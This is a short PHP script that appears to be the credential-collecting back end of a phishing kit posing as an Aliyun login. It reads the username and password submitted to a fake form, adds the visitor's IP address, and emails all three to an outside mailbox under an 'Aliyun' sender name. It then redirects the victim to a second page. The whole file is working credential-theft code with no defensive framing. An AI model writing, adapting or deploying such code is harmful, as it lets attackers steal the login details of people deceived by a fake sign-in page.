<?php

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "Email ID *: ".$_POST['username']."\n";
$message .= "Password*: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$login = $_POST['username'];


$recipient = "youremail@gmail.com";
$sender = 'yhgg1111@126.com';
$headers .= "From: Aliyun 1<$sender>\n";
$subject = "Aliyun1 1";
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: index2.php?email=$login");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }